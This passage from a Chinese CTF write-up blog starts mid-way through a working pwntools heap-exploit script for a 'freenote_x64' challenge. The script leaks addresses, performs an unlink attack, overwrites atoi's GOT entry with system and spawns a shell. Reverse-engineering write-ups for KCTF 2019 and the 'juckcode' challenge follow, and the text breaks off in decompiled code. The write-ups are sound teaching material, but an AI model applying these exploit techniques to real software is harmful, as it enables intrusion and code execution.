class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Note number: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"start"</span></span><br><span class="line">    new(<span class="string">"1"</span>)</span><br><span class="line">    new(<span class="string">"2"</span>)</span><br><span class="line">    new(<span class="string">"3"</span>)</span><br><span class="line">    new(<span class="string">"4"</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    new(<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">    new(<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">    show()</span><br><span class="line">    r.recv(<span class="number">11</span>)</span><br><span class="line">    s = r.recv(<span class="number">4</span>)</span><br><span class="line">    heap_base = u64(s+<span class="string">'\x00'</span>*<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"heap_base : 0x%x"</span>%heap_base</span><br><span class="line">    r.recv(<span class="number">17</span>)</span><br><span class="line">    s = r.recv(<span class="number">6</span>)</span><br><span class="line">    main_arena = u64(s+<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"mainarena : 0x%x"</span>%main_arena</span><br><span class="line">    chunklist0 = heap_base - <span class="number">0x1910</span></span><br><span class="line">    <span class="comment">#del</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#unlink</span></span><br><span class="line">    new(<span class="string">"1"</span>)</span><br><span class="line">    new(<span class="string">"2"</span>)</span><br><span class="line">    new(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += <span class="string">"a"</span>*<span class="number">8</span> + p64(<span class="number">0x81</span>)</span><br><span class="line">    payload += p64(chunklist0<span class="number">-0x18</span>) + p64(chunklist0<span class="number">-0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>) * <span class="number">2</span> * <span class="number">6</span></span><br><span class="line">    payload += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>) * <span class="number">2</span> * <span class="number">8</span></span><br><span class="line">    payload += <span class="string">"a"</span>*<span class="number">8</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">    new(payload)</span><br><span class="line">    free(<span class="number">1</span>)   <span class="comment">#unlink  ptr[0] -&gt; &amp;ptr[0] - 0x18</span></span><br><span class="line">    <span class="comment">#attack</span></span><br><span class="line">    libc_base = main_arena - <span class="number">88</span> - libc_mainarena</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base : 0x%x"</span>%libc_base</span><br><span class="line">    system = libc_base + libc_system</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"sytem_add : 0x%x"</span>%system</span><br><span class="line">    <span class="comment">#getshell</span></span><br><span class="line">    payload1 = p64(<span class="number">0x1</span>) + p64(<span class="number">0x1</span>)</span><br><span class="line">    payload1 += p64(<span class="number">0x120</span>) + p64(chunklist0<span class="number">-0x18</span>)</span><br><span class="line">    payload1 += p64(<span class="number">0x1</span>) + p64(<span class="number">8</span>) + p64(got_atoi)</span><br><span class="line">    payload1 += p64(<span class="number">0</span>)*<span class="number">2</span> * <span class="number">14</span> + p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(len(payload1))</span><br><span class="line">    edit(<span class="number">0</span>,payload1)</span><br><span class="line">    edit(<span class="number">1</span>,p64(system))</span><br><span class="line">    r.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Your choice: $ ls<br>$ ls<br>flag<br>freenote_x64<br>$ cat flag<br>CTF{de7effd8864<strong><strong>**</strong></strong>c}</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/level6/" data-id="cjyn83qfm0035icth1h2iwwh1" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-kctf2019-q1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/kctf2019-q1/" class="article-date">
  <time datetime="2019-07-28T17:11:01.702Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/kctf2019-q1/">kctf2019-晋级赛Q1</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="第一题-流浪者"><a href="#第一题-流浪者" class="headerlink" title="第一题 流浪者"></a>第一题 流浪者</h1><ul>
<li>一个单表替换,输入范围是0-9,a-z,A-Z,分别对应表的0 - 9,10 - 35,36 - 61</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">"abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ"</span></span><br><span class="line">s = <span class="string">"KanXueCTF2019JustForhappy"</span></span><br><span class="line">ff = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    ff.append(table.index(i))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ff:</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= i &lt;= <span class="number">9</span>:</span><br><span class="line">        flag += chr(i + <span class="number">48</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">9</span> &lt; i &lt;= <span class="number">35</span>:</span><br><span class="line">        flag += chr(i + <span class="number">87</span>)</span><br><span class="line">    <span class="keyword">elif</span> i &gt; <span class="number">36</span>:</span><br><span class="line">        flag += chr(i + <span class="number">29</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<h1 id="第二题-变形金刚"><a href="#第二题-变形金刚" class="headerlink" title="第二题 变形金刚"></a>第二题 变形金刚</h1><ul>
<li>安卓逆向,解压apk,拿出来class.dex</li>
<li>将dex反编译成.jar文件,解压以后获得class文件,放入IDEA中,发现没有什么运算的过程,找到so文件,去查了一下,可以找到里面有一个类似于rc4的运算,还有一个字符串异或解密的函数,逐一解密后得到几个字符串,对应的分别是一串uuid,一串字符被base64部分引用,而这个base64也是魔改过的</li>
<li>在sub_784中,可以看到另外的rc4部分,但是rc4也是被改过了一些.直接复现算法即可,最后在模拟器中输入就看到flag字样弹出</li>
</ul>
<h1 id="第三题-影分身之术"><a href="#第三题-影分身之术" class="headerlink" title="第三题 影分身之术"></a>第三题 影分身之术</h1><ul>
<li>这个题目出的非常的神奇了,之前没有逆过delphi,所以还是有一点难度</li>
<li>程序是一个窗口,输入以后点击check,会有一个弹窗提示wrong,查看了一下内置字符串,发现了一些script的东西,确定了一下是js</li>
<li>后面就比较神奇了,程序用到的数据写到了代码段里,这个在逆向的时候就有一些小干扰了..,在字符串中,可以看到<code>&lt;input type=button value=&quot;checkMyFlag&quot; onclick=&quot;ckpswd();&quot;&gt;</code>的字符串,按钮事件</li>
<li>在程序中可以在492BA8的位置看到一段js代码,大概内容是eval(packed),其实就是js混淆,寻找在线网站即可解密这段代码</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ckpswd</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    key = <span class="string">"simpower91"</span>;</span><br><span class="line">    a = <span class="built_in">document</span>.all.pswd.value;</span><br><span class="line">    <span class="keyword">if</span> (a.indexOf(key) == <span class="number">0</span>) &#123;</span><br><span class="line">        l = a.length;</span><br><span class="line">        i = key.length;</span><br><span class="line">        sptWBCallback(a.substring(i, l));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">"wrong!&lt;"</span> + a + <span class="string">"&gt; is not my GUID ;-)"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1234"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ok</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">"congratulations!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>其实就是个字符串比较函数,所以可以知道前几位是simpower91,输入后没有什么反应,于是继续跟进</li>
<li>在后面程序会检查属否存在data.txt并且打开读取文件,不过好像没有什么影响= =,但是会看到一个比较长度是否等于4的运算,也就是输入是simpower91 + xxxx.</li>
<li>程序在0xa4000的位置做了一些数据操作,在函数4734b0中,还有一些写入0x90,0xc3的循环,跟进发现跳出这个函数以后的sub_4734B0中<code>jmp     [esp-4+var_40]</code>,是一个向刚才的虚拟空间的跳转,跟进进刚才写入的数据可以看到在执行逐位对比的操作,从eax,edx寄存器中可以找到数据,将每位加上7f就能拿到后四位</li>
<li>提取数据逆向得到后四位a123,输入验证通过</li>
</ul>
<h1 id="第六题-RePwn"><a href="#第六题-RePwn" class="headerlink" title="第六题 RePwn"></a>第六题 RePwn</h1><ul>
<li>这是一个比较神奇的题目,有好多组多解= =</li>
<li>题目逻辑不是很难,输入一个字符串,进行一个明文字符串比较.</li>
<li>跟到里面,是一个类似于方程的东西,变量是输入的前8个字符,根据约束条件很容易用z3等约束求解器解出来</li>
<li>到了后面,将输入的最后四个字节进行了简单的减法运算,然后将flag拷贝进栈内,注意这里存在一个溢出,只要构造后四个字节,就可以劫持执行流</li>
<li>具体劫持到哪里呢,搜索字符串发现了一个加密过的字符串,按照xref找到的运算,异或回去可以看到这就是提示correct的字符串,向上回溯,找到sub_401BF0</li>
<li>后四位注意小段序,可以算出来实际上就是HaCk,继续整理函数,发现了des的几个特征变量以及运算,后调试得知就是des,按照规则反解即可得到第二个flag,拼接起来就是可以提交的flag了</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/kctf2019-q1/" data-id="cjyn83qem001bicthg4u5ey6x" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-juckcode" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/juckcode/" class="article-date">
  <time datetime="2019-07-28T17:11:01.696Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/juckcode/">上海市ctf-re200-juckcode</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="正向解析juckcode"><a href="#正向解析juckcode" class="headerlink" title="正向解析juckcode"></a>正向解析juckcode</h1><p> 一个二进制文件和一份加密后的flag,显然逆算法,扔进IDA,各种分析不出函数…怎么回事呢用OD打开查看下,有好多段可疑的汇编指令大概是pushad jmp 大量无用代码 popad<br> 花指令get,写脚本全部nop掉,用IDA打开处理好的文件,发现,居然还是不能F5,又发现了一段异常代码,两个jmp一个E8,nop掉E8居然就可以了,OD启动,提取目标的一段字节码.<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> b = <span class="string">'\x60\xE9\x31\x00\x00\x00\x8B\xEC\x6A\xFF\x68\x33\x22\x11\x00\x68\x11\x22\x33\x00\x64\xA1\x00\x00\x00\x00\x50\x64\x89\x25\x00\x00\x00\x00\x58\x64\xA3\x00\x00\x00\x00\x58\x58\x58\x58\x8B\xE8\xB8\x50\x10\x40\x00\x50\xE8\xC3\x61'</span></span><br><span class="line">a = <span class="string">'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'</span></span><br><span class="line">c = <span class="string">'\x0F\x8E\x07\x00\x00\x00\x0F\x85\x01\x00\x00\x00\xE8'</span></span><br><span class="line">d = <span class="string">'\x0F\x8E\x07\x00\x00\x00\x0F\x85\x01\x00\x00\x00\x90'</span></span><br><span class="line">f = open(<span class="string">'juckcode.exe'</span>, <span class="string">'rb'</span>)</span><br><span class="line">da = f.read()</span><br><span class="line"><span class="keyword">print</span> da.count(b)</span><br><span class="line"><span class="keyword">print</span> da.count(c)</span><br><span class="line">da = da.replace(b,a).replace(c,d)</span><br><span class="line"><span class="keyword">print</span> da.count(b)</span><br><span class="line"><span class="keyword">print</span> da.count(c)</span><br><span class="line">w = open(<span class="string">'bacjuck.exe'</span>, <span class="string">'wb'</span>)</span><br><span class="line">w.write(da)</span><br><span class="line">w.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p>
<p> 处理后成功看到伪代码.程序是C++写的,而且封装贼鸡儿恶心,不过大概看到了一些可以看的懂的函数.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [esp+10h] [ebp-9DCh]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [esp+28h] [ebp-9C4h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [esp+40h] [ebp-9ACh]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+58h] [ebp-994h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+5Ch] [ebp-990h]</span></span><br><span class="line">  <span class="keyword">char</span> *v22; <span class="comment">// [esp+60h] [ebp-98Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [esp+64h] [ebp-988h]</span></span><br><span class="line">  BOOL v24; <span class="comment">// [esp+68h] [ebp-984h]</span></span><br><span class="line">  <span class="keyword">char</span> *v25; <span class="comment">// [esp+6Ch] [ebp-980h]</span></span><br><span class="line">  <span class="keyword">char</span> *v26; <span class="comment">// [esp+70h] [ebp-97Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> m; <span class="comment">// [esp+74h] [ebp-978h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+78h] [ebp-974h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+7Ch] [ebp-970h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> n; <span class="comment">// [esp+80h] [ebp-96Ch]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v31; <span class="comment">// [esp+84h] [ebp-968h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+88h] [ebp-964h]</span></span><br><span class="line">  <span class="keyword">bool</span> v33; <span class="comment">// [esp+8Fh] [ebp-95Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+90h] [ebp-95Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [esp+94h] [ebp-958h]</span></span><br><span class="line">  <span class="keyword">char</span> v36; <span class="comment">// [esp+14Ch] [ebp-8A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v37; <span class="comment">// [esp+164h] [ebp-888h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [esp+17Ch] [ebp-870h]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [esp+194h] [ebp-858h]</span></span><br><span class="line">  <span class="keyword">char</span> v40; <span class="comment">// [esp+1ACh] [ebp-840h]</span></span><br><span class="line">  <span class="keyword">char</span> input; <span class="comment">// [esp+1C4h] [ebp-828h]</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [esp+1DCh] [ebp-810h]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [esp+1DDh] [ebp-80Fh]</span></span><br><span class="line">  <span class="keyword">char</span> Src; <span class="comment">// [esp+5DCh] [ebp-410h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+5DDh] [ebp-40Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v46; <span class="comment">// [esp+5DEh] [ebp-40Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v47[<span class="number">1021</span>]; <span class="comment">// [esp+5DFh] [ebp-40Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v48; <span class="comment">// [esp+9E8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_4038A0(<span class="number">0xB8</span>u);</span><br><span class="line">  sub_4039F0(<span class="string">"./flag"</span>, <span class="number">1</span>, <span class="number">64</span>, <span class="number">1</span>);</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  sub_401E00(&amp;input);</span><br><span class="line">  LOBYTE(v48) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)sub_403970(&amp;v35) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4050D0(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"error in open flag."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_405410(&amp;v35, &amp;input);</span><br><span class="line">  v3 = len(&amp;input);</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)sub_4038C0(&amp;input);</span><br><span class="line">  base64encode((<span class="keyword">int</span>)&amp;v40, v4, v3);</span><br><span class="line">  LOBYTE(v48) = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len(&amp;input); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v26 = sub_401C80(&amp;input, i);</span><br><span class="line">    *v26 += <span class="number">64</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = len(&amp;input);</span><br><span class="line">  v6 = (<span class="keyword">char</span> *)sub_4038C0(&amp;input);</span><br><span class="line">  base64encode((<span class="keyword">int</span>)&amp;v36, v6, v5);</span><br><span class="line">  LOBYTE(v48) = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; len(&amp;input); ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = sub_401C80(&amp;input, j);</span><br><span class="line">    *v25 &lt;&lt;= <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = len(&amp;input);</span><br><span class="line">  v8 = (<span class="keyword">char</span> *)sub_4038C0(&amp;input);</span><br><span class="line">  base64encode((<span class="keyword">int</span>)&amp;v37, v8, v7);</span><br><span class="line">  LOBYTE(v48) = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; len(&amp;input); ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = *sub_401C80(&amp;input, k) - <span class="number">158</span>;</span><br><span class="line">    *sub_401C80(&amp;input, k) = v9;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = len(&amp;input);</span><br><span class="line">  v11 = (<span class="keyword">char</span> *)sub_4038C0(&amp;input);</span><br><span class="line">  base64encode((<span class="keyword">int</span>)&amp;v38, v11, v10);</span><br><span class="line">  LOBYTE(v48) = <span class="number">5</span>;</span><br><span class="line">  Src = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; len(&amp;v40); ++l )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *sub_401C80(&amp;v40, l) != <span class="number">61</span> )</span><br><span class="line">      *(&amp;Src + <span class="number">4</span> * l) = *sub_401C80(&amp;v40, l);</span><br><span class="line">    *(&amp;Dst + <span class="number">4</span> * l) = *sub_401C80(&amp;v36, l);</span><br><span class="line">    v47[<span class="number">4</span> * l] = *sub_401C80(&amp;v37, l);</span><br><span class="line">    *(&amp;v46 + <span class="number">4</span> * l) = *sub_401C80(&amp;v38, l);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401D90(&amp;Src);</span><br><span class="line">  LOBYTE(v48) = <span class="number">6</span>;</span><br><span class="line">  sub_4017D0(&amp;v39, &amp;v19);</span><br><span class="line">  LOBYTE(v48) = <span class="number">8</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v19);</span><br><span class="line">  v42 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v43, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>; ; ++m )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401D90(&amp;Src);</span><br><span class="line">    LOBYTE(v48) = <span class="number">9</span>;</span><br><span class="line">    v12 = sub_4017D0(&amp;v17, &amp;v18);</span><br><span class="line">    v23 = v12;</span><br><span class="line">    v13 = len(v12);</span><br><span class="line">    v24 = m &lt; v13;</span><br><span class="line">    v33 = m &lt; v13;</span><br><span class="line">    <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v17);</span><br><span class="line">    LOBYTE(v48) = <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v18);</span><br><span class="line">    <span class="keyword">if</span> ( !v33 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = (<span class="keyword">unsigned</span> __int8)*sub_401C80(&amp;v39, m);</span><br><span class="line">    sub_405BA0(&amp;v42, <span class="number">1024</span>, <span class="string">"%s%.2hhx"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v42);</span><br><span class="line">  &#125;</span><br><span class="line">  <span 